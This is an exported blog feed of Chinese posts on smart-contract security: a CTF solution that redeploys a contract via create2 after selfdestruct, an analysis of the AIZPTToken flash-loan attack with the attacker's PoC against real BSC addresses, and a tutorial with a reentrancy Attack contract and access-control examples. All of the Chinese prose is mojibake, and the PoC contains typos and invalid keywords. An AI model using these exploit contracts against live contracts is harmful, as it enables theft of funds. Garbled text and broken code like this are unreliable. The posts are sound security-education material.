SendFlagäº‹ä»¶<br>  æ¥ä¸‹æ¥å°±æ˜¯è€ƒè™‘å¦‚ä½•ç”¨ä»£ç å®ç°createçš„åŠŸèƒ½</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.5.10;</span><br><span class="line"></span><br><span class="line">contract Deployer &#123;</span><br><span class="line">Â  Â  bytes public deployBytecode;</span><br><span class="line">Â  Â  address public deployedAddr;</span><br><span class="line">Â  Â  </span><br><span class="line">Â  Â  function deploy(bytes memory code) public &#123;</span><br><span class="line">Â  Â  Â  Â  deployBytecode = code;</span><br><span class="line">Â  Â  Â  Â  address a;</span><br><span class="line">Â  Â  Â  Â  // Compile Dumper to get this bytecode</span><br><span class="line">Â  Â  Â  Â  bytes memory dumperBytecode = hex&#x27;6080604052348015600f57600080fd5b50600033905060608173ffffffffffffffffffffffffffffffffffffffff166331d191666040518163ffffffff1660e01b815260040160006040518083038186803b158015605c57600080fd5b505afa158015606f573d6000803e3d6000fd5b505050506040513d6000823e3d601f19601f820116820180604052506020811015609857600080fd5b81019080805164010000000081111560af57600080fd5b8281019050602081018481111560c457600080fd5b815185600182028301116401000000008211171560e057600080fd5b50509291905050509050805160208201f3fe&#x27;;</span><br><span class="line">Â  Â  Â  Â  assembly &#123;</span><br><span class="line">Â  Â  Â  Â  Â  Â  a := create2(callvalue, add(0x20, dumperBytecode), mload(dumperBytecode), 0x8866)</span><br><span class="line">Â  Â  Â  Â  &#125;</span><br><span class="line">Â  Â  Â  Â  deployedAddr = a;</span><br><span class="line">Â  Â  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Dumper &#123;</span><br><span class="line">Â  Â  constructor() public &#123;</span><br><span class="line">Â  Â  Â  Â  Deployer dp = Deployer(msg.sender);</span><br><span class="line">Â  Â  Â  Â  bytes memory bytecode = dp.deployBytecode();</span><br><span class="line">Â  Â  Â  Â  assembly &#123;</span><br><span class="line">Â  Â  Â  Â  Â  Â  return (add(bytecode, 0x20), mload(bytecode))</span><br><span class="line">Â  Â  Â  Â  &#125;</span><br><span class="line">Â  Â  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šæœ‰ä¿©ä¸ªä»£ç ï¼Œå…ˆéƒ¨ç½²Dumperåˆçº¦ï¼Œè·å¾—å®ƒçš„å­—èŠ‚ç ï¼ŒDeployeråˆçº¦å®ç°create2çš„åŠŸèƒ½<br>é¦–å…ˆå…ˆå°†Deployer éƒ¨ç½²ï¼Œè·å¾—åœ°å€ï¼š0x307FdF03B1842A501F52221e4cF02D67BfeEc399<br>ç„¶åä½¿ç”¨Deployer.deployéƒ¨ç½²0x33ffï¼Œå¾—åˆ°éƒ¨ç½²çš„åˆçº¦åœ°å€0x2b473f517088f6d08e82cA06dD5A5e6A68Eb4663</p><p>è°ƒç”¨check()ï¼Œtargetå°±æ˜¯æˆ‘ä»¬éƒ¨ç½²çš„åˆçº¦</p><p>ç„¶ååœ¨è¿›è¡Œè‡ªæ¯ï¼Œç»™æˆ‘ä»¬å·²ç»éƒ¨ç½²çš„åˆçº¦å‘ä¸€ç¬”ç©ºäº¤æ˜“ï¼Œè®©å®ƒè¿›è¡Œè‡ªæ¯ï¼Œå†æ¬¡ä½¿ç”¨create2çš„æ“ä½œï¼Œè¿˜æ˜¯ä½¿ç”¨Deployer.deployåœ¨è¿™ä¸ªåœ°å€éƒ¨ç½²å¦ä¸€ä¸ªåˆçº¦ï¼Œåˆçº¦çš„å†…å®¹è¦åŒ…æ‹¬emit SendFlag(0),<br>è¿™é‡Œæœ‰ä¸ªç®€å•çš„hackåˆçº¦<br>contract hack {<br>    event SendFlag(address addr);<br>    constructor() public {<br>        emit SendFlag(address(0));<br>    }<br>}<br>æœ€åå†è°ƒç”¨executeå‡½æ•°ï¼Œå°±ä¼šæ‰§è¡Œæˆ‘ä»¬ç¬¬äºŒæ¬¡éƒ¨ç½²çš„åˆçº¦é‡Œçš„emit SendFlag;</p><p>å®Œæˆä»¥ä¸Šæ­¥éª¤ï¼Œå°±å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å·²ç»æˆåŠŸæ‰§è¡Œäº†emit SendFlag</p><h1 id="è¡¥å……"><a href="#è¡¥å……" class="headerlink" title="è¡¥å……"></a>è¡¥å……</h1><p>creat2çš„ç”¨æ³•ï¼šåœ¨solidity 8.0ç‰ˆæœ¬ä¹‹åï¼Œéƒ½æ˜¯ä½¿ç”¨newå…³é”®å­—æ¥åˆ›å»ºåˆçº¦ï¼Œä½†æ˜¯å®ƒè¿˜æœ‰ä¸€ç§å°±æ˜¯ä½¿ç”¨å†…è”æ±‡ç¼–(assembly)</p><p>ä¸»è¦è¯´ä¸€ä¸‹ï¼Œnewçš„æ–¹æ³•åˆ›å»ºåˆçº¦.ç›´æ¥ä¸Šåˆçº¦</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">// è¢«åˆ›å»ºåˆçº¦</span><br><span class="line">contract Callee &#123;</span><br><span class="line">  string value1;</span><br><span class="line">  string value2;</span><br><span class="line"></span><br><span class="line">  // æ„é€ å‡½æ•°æœ‰ä¸¤ä¸ªå‚æ•°</span><br><span class="line">  constructor(string memory _value1,string memory _value2) &#123;</span><br><span class="line">    value1 = _value1;</span><br><span class="line">    value2 = _value2;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// åˆçº¦åˆ›å»ºè€…</span><br><span class="line">contract ContractCreator &#123;</span><br><span class="line">  // æ–°åˆçº¦åœ°å€</span><br><span class="line">  address public contractAddress;</span><br><span class="line"></span><br><span class="line">  // åˆ›å»ºåˆçº¦</span><br><span class="line">  function newContract(string memory value1,string memory value2) external &#123;</span><br><span class="line">    // ç”Ÿæˆç›å€¼</span><br><span class="line">    bytes32 salt = keccak256(abi.encodePacked(value1,value2));</span><br><span class="line">    // åˆ›å»º Callee åˆçº¦å®ä¾‹ï¼Œå‚æ•°ä¸º _salt, value1, value2</span><br><span class="line">    Callee callee = new Callee&#123;salt:salt&#125;(value1, value2);</span><br><span class="line">    // è®¾ç½®æ–°å»ºåˆçº¦çš„åœ°å€</span><br><span class="line">    contractAddress = address(callee);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>å§”æ‰˜è°ƒç”¨:çœ‹è¿™ä¿©ç¯‡<a href="https://learnblockchain.cn/article/5372">æ–‡ç« 1</a>ï¼Œ<a href="https://blog.csdn.net/ak19920601/article/details/135908265">æ–‡ç« 2</a>,è®²çš„å¾ˆå¥½ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20241005AIZPTTokenæ”»å‡»äº‹ä»¶åˆ†æ</title>
      <link href="/2024/10/12/20241005AIZPTToken%E8%AE%A1%E7%AE%97%E9%94%99%E8%AF%AF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2024/10/12/20241005AIZPTToken%E8%AE%A1%E7%AE%97%E9%94%99%E8%AF%AF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="AIZPTTokenæ”»å‡»äº‹ä»¶åˆ†æ"><a href="#AIZPTTokenæ”»å‡»äº‹ä»¶åˆ†æ" class="headerlink" title="AIZPTTokenæ”»å‡»äº‹ä»¶åˆ†æ"></a>AIZPTTokenæ”»å‡»äº‹ä»¶åˆ†æ</h2><p>å…ˆå¤§æ¦‚æè¿°ä¸€ä¸‹ï¼šæ”»å‡»è€…ä½¿ç”¨é—ªç”µè´·å€Ÿçš„é’±ï¼Œç„¶åå†è´­ä¹°äº†ä»·å€¼8000 BNBçš„AIPTToken,ç„¶åå†ä»¥é«˜ä»·å–å‡ºï¼Œä»ä¸­å¾—åˆ°åˆ©æ¶¦ï¼Œè¿˜æ¸…å€Ÿæ¬¾ï¼Œæœ€ç»ˆè·å¾—ä»·å€¼34BNBï¼ˆçº¦ä¿©ä¸‡ç¾é‡‘ï¼‰ã€‚</p><p>è¿™æ˜¯å‘ç”Ÿåœ¨æœ€è¿‘çš„æ”»å‡»ï¼Œé¦–å…ˆæ”»å‡»è€…å‘ç°äº†è¿™ä¸ªAIZPTTokenä»£å¸ä¹°å–çš„è®¡ç®—é”™è¯¯ï¼Œä¸‹é¢æ˜¯æˆªå–çš„AIZPTTokenåˆçº¦ä¸­çš„ä¸€æ®µä»£ç </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function buy() internal &#123;</span><br><span class="line">   require(tradingEnable, &#x27;Trading not enable&#x27;);</span><br><span class="line"></span><br><span class="line">   uint256 swapValue = msg.value;</span><br><span class="line"></span><br><span class="line">   uint256 token_amount = (swapValue * _balances[address(this)]) / (address(this).balance);</span><br><span class="line"></span><br><span class="line">   require(token_amount &gt; 0, &#x27;Buy amount too low&#x27;);</span><br><span class="line"></span><br><span class="line">   uint256 user_amount = token_amount * 50 / 100;</span><br><span class="line">   uint256 fee_amount = token_amount - user_amount;</span><br><span class="line"></span><br><span class="line">   _transfer(address(this), msg.sender, user_amount);</span><br><span class="line">   _transfer(address(this), feeReceiver, fee_amount);</span><br><span class="line"></span><br><span class="line">   emit Swap(msg.sender, swapValue, 0, 0, user_amount);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> function sell(uint256 sell_amount) internal &#123;</span><br><span class="line">   require(tradingEnable, &#x27;Trading not enable&#x27;);</span><br><span class="line"></span><br><span class="line">   uint256 ethAmount = (sell_amount * address(this).balance) / (_balances[address(this)] + sell_amount);</span><br><span class="line"></span><br><span class="line">   require(ethAmount &gt; 0, &#x27;Sell amount too low&#x27;);</span><br><span class="line">   require(address(this).balance &gt;= ethAmount, &#x27;Insufficient ETH in reserves&#x27;);</span><br><span class="line"></span><br><span class="line">   uint256 swap_amount = sell_amount * 50 / 100;</span><br><span class="line">   uint256 burn_amount = sell_amount - swap_amount;</span><br><span class="line"></span><br><span class="line">   _transfer(msg.sender, address(this), swap_amount);</span><br><span class="line">   _transfer(msg.sender, address(0), burn_amount);</span><br><span class="line"></span><br><span class="line">   payable(msg.sender).transfer(ethAmount);</span><br><span class="line"></span><br><span class="line">   emit Swap(msg.sender, 0, sell_amount, ethAmount, 0);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> receive() external payable &#123;</span><br><span class="line">   buy();</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>ä»ä¸Šé¢ï¼Œå¯ä»¥å‘ç°ï¼Œç”¨å°‘é‡çš„BNBè´­ä¹°AIZPTToken,å°±å¯ä»¥ä»¥é«˜ä»·å‡ºå”®ï¼Œå…·ä½“å¯ä»¥å¯¹æ¯”ä¿©æ®µä»£ç </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint256 token_amount = (swapValue * _balances[address(this)]) / (address(this).balance);</span><br><span class="line"></span><br><span class="line">uint256 ethAmount = (sell_amount * address(this).balance) / (_balances[address(this)] + sell_amount);</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªæ˜¯ä¹°AIPTToken,å¦‚æœä»¥20çš„ä»·é’±è´­ä¹°12ä¸ªä»£å¸ï¼Œç„¶åæˆ‘ä»¬å‡ºå”®ä»£å¸çš„æ—¶å€™ï¼Œä»¥åŒæ ·20çš„ä»·æ ¼å‡ºå”®ï¼Œé‚£ä¹ˆè´­ä¹°äººè·å¾—ä»£å¸çš„æ•°é‡æ˜¯å°‘äº12çš„ï¼Œæ¢ç§æ–¹æ³•æ¥è¯´ï¼Œå°±æ˜¯å¯ä»¥ä»¥é«˜ä»·å‡ºå”®ç›¸åŒä»£å¸çš„æ•°é‡</p><p>ä¸‹é¢æ˜¯æ”»å‡»è€…çš„æ”»å‡»çš„æµ‹è¯•åˆçº¦</p><pre><code>//SPDX-License-Identifier: MITpragma solidity ^0.8.13;import &quot;forge-std/Test.sol&quot;import &quot;../interface.sol&quot;address constant PancakeV3Pool = 0x36696169C63e42cd08ce11f5deeBbCeBae652050;address constant BUSDT = 0x55d398326f99059fF775485246999027B3197955;address constant weth = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;address constant AIZPT = 0xBe779D420b7D573C08EEe226B9958737b6218888;contract AIZPTTokentest is Test &#123;    address attracker = makeAddr(&quot;attracker&quot;);    function setUp() public&#123;        vm.creatPrankFork(&quot;bsc&quot;,42846998 - 1);    &#125;    function testPOC() public&#123;          vm.startPrank(attracker);          Attracker attracker = new Attrceker();          vm.label(address(attracker),&quot;attracek&quot;) ;          attracker.attrack();          console.log(&quot;&quot;)     &#125;&#125;interface IFS is IERC20&#123;    function flash(address recipient,uint256 amount0,uint256 amount1,bytes caaldata data) external;    function withdraw (uint256) external;    function deposit() exteranl paybale;&#125;contract Attracker&#123;    function attrack() external&#123;      IFS(Pancakev3Pool).flash(address(this),0,8000ehter,&quot;&quot;);            //å°†æ”»å‡»åˆçº¦ä¸­å‰©ä¸‹çš„é’±è½¬ç»™æ”»å‡»è€…è‡ªå·±çš„åœ°å€        IERC20(weth).transfer(            msg.sender,             IERC20(weth).balanceOf(address(this))        );    &#125;     function pancakeV3FlashCallback(        uint256 fee0,        uint256 fee1,        bytes calldata data    ) external &#123;        IFS(weth).withdraw(8000 ether);             AIZPT.call&#123;value: 8000 ether&#125;(&quot;&quot;);        //å‡ºå”®200æ¬¡        for (uint256 i; i &lt; 199; ++i) &#123;          //ä»¥383727 etherçš„ä»·æ ¼å–å‡ºä»£å¸            IERC20(AIZPT).transfer(AIZPT, 3837275 ether);        &#125;        IFS(weth).deposit&#123;value: address(this).balance&#125;();         // è¿˜æ¸…è´·æ¬¾å’Œåˆ©æ¯        IERC20(weth).transfer(PancakeV3Pool, 8004100000000000000000);    &#125;    receive() external payable&#123;&#125;&#125;ä»æµ‹è¯•åˆçº¦ä¸­æ¥çœ‹,å°±æ˜¯åœ¨æ‰§è¡Œé—ªç”µè´·å›è°ƒçš„æ—¶å€™,è¿›è¡Œä¸€ä¸ªè´­ä¹°å‡ºå”®çš„æ“ä½œå®Œæ•´çš„è°ƒç”¨ä¿¡æ¯[ç‚¹å‡»](https://app.blocksec.com/explorer/tx/bsc/0x5e694707337cca979d18f9e45f40e81d6ca341ed342f1377f563e779a746460d?line=998&amp;debugLine=998)</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>æ™ºèƒ½åˆçº¦çš„æ¼æ´</title>
      <link href="/2024/10/07/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E7%9A%84%E6%BC%8F%E6%B4%9E/"/>
      <url>/2024/10/07/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E7%9A%84%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="æ™ºèƒ½åˆçº¦çš„æ¼æ´"><a href="#æ™ºèƒ½åˆçº¦çš„æ¼æ´" class="headerlink" title="æ™ºèƒ½åˆçº¦çš„æ¼æ´"></a>æ™ºèƒ½åˆçº¦çš„æ¼æ´</h1><h2 id="é‡å…¥æ”»å‡»"><a href="#é‡å…¥æ”»å‡»" class="headerlink" title="é‡å…¥æ”»å‡»"></a>é‡å…¥æ”»å‡»</h2><p> é‡å…¥æ¼æ´æœ¬è´¨ä¸Šæ˜¯çŠ¶æ€åŒæ­¥é—®é¢˜ï¼Œå½“æ™ºèƒ½åˆçº¦è°ƒç”¨å¤–éƒ¨å‡½æ•°æ—¶ï¼Œæ‰§è¡Œæµä¼šè½¬ç§»åˆ°è¢«è°ƒç”¨çš„åˆçº¦ï¼Œå¦‚æœè°ƒç”¨åˆçº¦æœªèƒ½æ­£ç¡®åŒæ­¥çŠ¶æ€ï¼Œåˆ™åœ¨æµç¨‹è½¬ç§»è¿‡ç¨‹ä¸­å¯èƒ½ä¼šè¢«é‡æ–°è¿›å…¥ï¼Œå¯¼è‡´é‡å¤æ‰§è¡Œç›¸åŒçš„ä»£ç é€»è¾‘ã€‚å…·ä½“æ¥è¯´ï¼Œæ”»å‡»é€šå¸¸åˆ†ä¸¤ä¸ªæ­¥éª¤å±•å¼€ï¼š<br>1ï¼Œè¢«æ”»å‡»åˆçº¦è°ƒç”¨æ”»å‡»åˆçº¦çš„å¤–éƒ¨å‡½æ•°ï¼Œå¹¶è½¬ç§»æ‰§è¡Œæµç¨‹ã€‚<br>2ï¼Œåœ¨æ”»å‡»åˆçº¦å‡½æ•°å†…éƒ¨ï¼Œåˆ©ç”¨ä¸€å®šçš„æŠ€å·§ï¼Œå†æ¬¡è°ƒç”¨è¢«æ”»å‡»åˆçº¦çš„æ¼æ´å‡½æ•°ã€‚<br>ç”±äºä»¥å¤ªåŠè™šæ‹Ÿæœº (EVM) æ˜¯å•çº¿ç¨‹çš„ï¼Œå› æ­¤åœ¨é‡æ–°è¿›å…¥æ˜“å—æ”»å‡»çš„å‡½æ•°æ—¶ï¼Œåˆçº¦çŠ¶æ€ä¸ä¼šæ­£ç¡®æ›´æ–°ï¼Œç±»ä¼¼äºåˆå§‹è°ƒç”¨ã€‚è¿™å…è®¸æ”»å‡»è€…é‡å¤æ‰§è¡ŒæŸäº›ä»£ç é€»è¾‘ï¼Œä»è€Œå®ç°æ„å¤–è¡Œä¸ºã€‚å…¸å‹çš„æ”»å‡»æ¨¡å¼æ¶‰åŠå¤šæ¬¡é‡å¤çš„èµ„é‡‘æå–ã€‚</p><h3 id="ä¸¾ä¾‹"><a href="#ä¸¾ä¾‹" class="headerlink" title="ä¸¾ä¾‹"></a>ä¸¾ä¾‹</h3><p>ä»¥ä¿®æ”¹åçš„WETHä¸ºä¾‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract EtherStore &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    function deposit() public payable &#123;</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        uint256 bal = balances[msg.sender];</span><br><span class="line">        require(bal &gt; 0);</span><br><span class="line"></span><br><span class="line">        (bool sent,) = msg.sender.call&#123;value: bal&#125;(&quot;&quot;);</span><br><span class="line">        require(sent, &quot;Failed to send Ether&quot;);</span><br><span class="line"></span><br><span class="line">        balances[msg.sender] = 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Helper function to check the balance of this contract</span><br><span class="line">    function getBalance() public view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>åœ¨<strong>å­˜æ¬¾å‡½æ•°</strong>ä¸­ï¼Œç”¨æˆ·å¯ä»¥å­˜å…¥ETHï¼Œæ”¶åˆ°çš„WETHè®°å½•åœ¨<strong>ä½™é¢</strong>çŠ¶æ€å˜é‡ä¸­ã€‚</li><li>åœ¨<strong>withdrawå‡½æ•°</strong>ä¸­ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡è°ƒç”¨ call å‡½æ•°æ¥æå– ETHï¼Œ<strong>call</strong>å‡½æ•°ç”¨äºå‘ç”¨æˆ·è½¬è´¦ã€‚æ­¤æ—¶ï¼Œæ‰§è¡Œæµç¨‹è½¬ç§»åˆ°ç”¨æˆ·çš„åˆçº¦ã€‚å¦‚æœç”¨æˆ·åˆçº¦æ˜¯æ¶æ„çš„ï¼Œå®ƒå¯ä»¥é€šè¿‡é»˜è®¤çš„<strong>acceptå‡½æ•°é‡æ–°è¿›å…¥withdrawå‡½æ•°</strong>ã€‚ç”±äºä½™é¢æ²¡æœ‰æ›´æ–°ï¼Œ<strong>require</strong>è¯­å¥é€šè¿‡äº†æ£€æŸ¥ï¼Œä»è€Œå…è®¸æ”»å‡»åˆçº¦é‡å¤æå– ETHã€‚</li></ul><p>æ”»å‡»è€…å°±å¯ä»¥éƒ¨ç½²ä¸€ä¸ªåä¸ºAttackçš„æ¶æ„åˆçº¦ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line">    EtherStore public etherStore;</span><br><span class="line">    uint256 public constant AMOUNT = 1 ether;</span><br><span class="line"></span><br><span class="line">    constructor(address _etherStoreAddress) &#123;</span><br><span class="line">        etherStore = EtherStore(_etherStoreAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // receive is called when EtherStore sends Ether to this contract.</span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        if (address(etherStore).balance &gt;= AMOUNT) &#123;</span><br><span class="line">            etherStore.withdraw();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() external payable &#123;</span><br><span class="line">        require(msg.value &gt;= AMOUNT);</span><br><span class="line">        etherStore.deposit&#123;value: AMOUNT&#125;();</span><br><span class="line">        etherStore.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Helper function to check the balance of this contract</span><br><span class="line">    function getBalance() public view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>åœ¨<strong>æ”»å‡»å‡½æ•°</strong>ä¸­ï¼Œæ”»å‡»è€…é¦–å…ˆè½¬å…¥ä¸€å®šæ•°é‡çš„ETHï¼Œè°ƒç”¨<strong>etherStore.deposit</strong>å‡½æ•°å°†å…¶è½¬å…¥ç›®æ ‡åˆçº¦<strong>EtherStore</strong> ï¼Œç„¶åè°ƒç”¨<strong>etherStore.withdraw</strong>å‡½æ•°æç°ETHã€‚è¿™çœ‹ä¼¼æ˜¯ä¸€ä¸ªå¸¸è§„æ“ä½œï¼Œä½†é—®é¢˜å°±å‡ºç°åœ¨ä¸‹ä¸€ä¸ªå‡½æ•°ä¸­ã€‚</li><li>åˆçº¦æ”¶åˆ° ETH æ—¶é»˜è®¤æ‰§è¡Œçš„å‡½æ•°æ˜¯<strong>accept</strong>ï¼Œå®ƒæ ‡æœ‰<strong>payable</strong>å…³é”®å­—ï¼Œè¡¨ç¤ºå®ƒå¯ä»¥æ¥æ”¶å‘é€ç»™å®ƒçš„ ETHï¼ˆä½¿ç”¨<strong>fallback</strong>å‡½æ•°å¯ä»¥å®ç°ç±»ä¼¼çš„æ•ˆæœï¼‰ã€‚åœ¨å‡½æ•°å†…éƒ¨ï¼Œå¦‚æœç›®æ ‡åˆçº¦çš„ä½™é¢æ»¡è¶³æ¡ä»¶ï¼ˆå¤§äº 1 ETHï¼‰ï¼Œåˆ™å†æ¬¡è°ƒç”¨<strong>withdraw</strong>å‡½æ•°ï¼Œè§¦å‘é‡æ–°è¿›å…¥ã€‚ç”±äºç›®æ ‡åˆçº¦ä¸­ç”¨æˆ·ä½™é¢åªåœ¨æœ€åä¸€æ­¥æ›´æ–°ï¼Œå› æ­¤æ¡ä»¶<strong>require(bal &gt; 0)</strong>;ä»ç„¶æˆç«‹ï¼Œå…è®¸æ”»å‡»è€…ç»§ç»­ä»ç›®æ ‡åˆçº¦ä¸­æŠ½å– ETH ğŸ˜¨ğŸ˜¨ğŸ˜¨</li></ul><h2 id="è®¿é—®æ§åˆ¶æ¼æ´"><a href="#è®¿é—®æ§åˆ¶æ¼æ´" class="headerlink" title="è®¿é—®æ§åˆ¶æ¼æ´"></a>è®¿é—®æ§åˆ¶æ¼æ´</h2><h3 id="ä¸å—é™åˆ¶çš„åˆå§‹åŒ–å‡½æ•°"><a href="#ä¸å—é™åˆ¶çš„åˆå§‹åŒ–å‡½æ•°" class="headerlink" title="ä¸å—é™åˆ¶çš„åˆå§‹åŒ–å‡½æ•°"></a>ä¸å—é™åˆ¶çš„åˆå§‹åŒ–å‡½æ•°</h3><p>æŸäº›åˆçº¦åŒ…å«ç”¨äºè®¾ç½®æ‰€æœ‰è€…çš„åˆå§‹åŒ–å‡½æ•°ï¼Œä½†æœªèƒ½é™åˆ¶è¯¥å‡½æ•°åªèƒ½è°ƒç”¨ä¸€æ¬¡ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œå†æ¬¡è°ƒç”¨åˆå§‹åŒ–å‡½æ•°ï¼Œå°†æ‰€æœ‰æƒè½¬ç§»åˆ°ä»–ä»¬çš„è´¦æˆ·ä¸­ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function initContract() public &#123;</span><br><span class="line">    owner = msg.sender; // Lack of calling restriction</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="è¿‡åº¦æˆæƒçš„è§’è‰²"><a href="#è¿‡åº¦æˆæƒçš„è§’è‰²" class="headerlink" title="è¿‡åº¦æˆæƒçš„è§’è‰²"></a>è¿‡åº¦æˆæƒçš„è§’è‰²</h3><p>ä½¿ç”¨ OpenZeppelin çš„Ownableåº“æ—¶ï¼Œå¦‚æœå¤šä¸ªè§’è‰²è¢«åˆ†é…onlyOwneræƒé™ï¼Œåˆ™ä¼šå¢åŠ æ”»å‡»é¢ã€‚ä¸€æ—¦æ”»å‡»è€…è·å¾—å…·æœ‰æ‰€æœ‰è€…æƒé™çš„å¸æˆ·çš„è®¿é—®æƒé™ï¼Œä»–ä»¬å°±å¯ä»¥æ‰§è¡Œåˆçº¦ä¸­çš„ä»»ä½•å…³é”®åŠŸèƒ½ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function criticalFunction() public onlyOwner &#123;</span><br><span class="line">    // Critical logic</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ä»£å¸é”€æ¯å‡½æ•°æˆæƒä¸å½“"><a href="#ä»£å¸é”€æ¯å‡½æ•°æˆæƒä¸å½“" class="headerlink" title="ä»£å¸é”€æ¯å‡½æ•°æˆæƒä¸å½“"></a>ä»£å¸é”€æ¯å‡½æ•°æˆæƒä¸å½“</h3><p>å¦‚æœä»£å¸åˆçº¦ä¸­çš„é”€æ¯å‡½æ•°æ˜¯å…¬å¼€çš„ï¼Œä»»ä½•äººéƒ½å¯ä»¥è°ƒç”¨å®ƒæ¥é”€æ¯åˆ«äººçš„ä»£å¸ï¼Œä»è€Œæ“çºµä»£å¸ä¾›åº”ï¼Œå¯¼è‡´ä»·æ ¼æ³¢åŠ¨å’ŒæµåŠ¨æ€§æ¯ç«­ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function burn(address account, uint256 amount) public &#123;</span><br><span class="line">    _burn(account, amount); // No access control</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ERC20æ‰¹å‡†éª—å±€"><a href="#ERC20æ‰¹å‡†éª—å±€" class="headerlink" title="ERC20æ‰¹å‡†éª—å±€"></a>ERC20æ‰¹å‡†éª—å±€</h2><p>åœ¨åŒºå—é“¾ä¸–ç•Œä¸­ï¼Œä»¥å¤ªåŠçš„ERC20ä»£å¸æ ‡å‡†æ˜¯æœ€çŸ¥åçš„ä»£å¸åè®®æ ‡å‡†ä¹‹ä¸€ã€‚ç„¶è€Œåœ¨ERC20æ ‡å‡†å®æ–½è¿‡ç¨‹ä¸­ï¼Œå¯¹approveå‡½æ•°çš„æ»¥ç”¨ä¼šå¯¼è‡´ä¸€ä¸ªä¸¥é‡çš„å®‰å…¨æ¼æ´ApproveScam ã€‚æ¥ä¸‹æ¥å°†å¯¹ApproveScamæ¼æ´çš„åŸç†ã€åæœä»¥åŠç›¸åº”çš„é¢„é˜²æªæ–½è¿›è¡Œæ¢è®¨ã€‚</p><h3 id="ApproveScanæ¼æ´æ˜¯ä»€ä¹ˆ"><a href="#ApproveScanæ¼æ´æ˜¯ä»€ä¹ˆ" class="headerlink" title="ApproveScanæ¼æ´æ˜¯ä»€ä¹ˆ"></a>ApproveScanæ¼æ´æ˜¯ä»€ä¹ˆ</h3><p>ApproveScam æ¼æ´æºäºå¯¹ERC20 æ ‡å‡†ä¸­<strong>æ‰¹å‡†å‡½æ•°çš„æ»¥ç”¨</strong>ã€‚<strong>æ‰¹å‡†</strong>å‡½æ•°æ—¨åœ¨å…è®¸ä»£å¸æŒæœ‰è€…æˆæƒç‰¹å®šåœ°å€ä»æŒæœ‰è€…çš„è´¦æˆ·ä¸­è½¬å‡ºä¸€å®šæ•°é‡çš„ä»£å¸ã€‚ä½†æ˜¯ï¼Œå¦‚æœæŒæœ‰è€…æ‰¹å‡†çš„é‡‘é¢è¿‡å¤§ï¼ˆé€šå¸¸æ˜¯<strong>type(uint256).max</strong>è¡¨ç¤ºçš„æ— é™é‡‘é¢ï¼‰ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨æœªç»æŒæœ‰è€…åŒæ„çš„æƒ…å†µä¸‹ä»æŒæœ‰è€…çš„è´¦æˆ·ä¸­è½¬å‡ºæ‰€æœ‰ä»£å¸ã€‚</p><p>å…·ä½“æ¥è¯´ï¼Œä¸€æ—¦ Alice æˆæƒ Eve ä» Alice çš„è´¦æˆ·ä¸­è½¬å‡ºæ— é™é‡çš„ä»£å¸ï¼ŒEve å°±å¯ä»¥è°ƒç”¨transferFromå‡½æ•°å°† Alice è´¦æˆ·ä¸­çš„æ‰€æœ‰ä»£å¸è½¬ç§»åˆ°è‡ªå·±çš„è´¦æˆ·ä¸­ã€‚è¿™å°±æ˜¯ ApproveScam æ¼æ´çš„æ ¸å¿ƒåŸç†ã€‚</p><figure 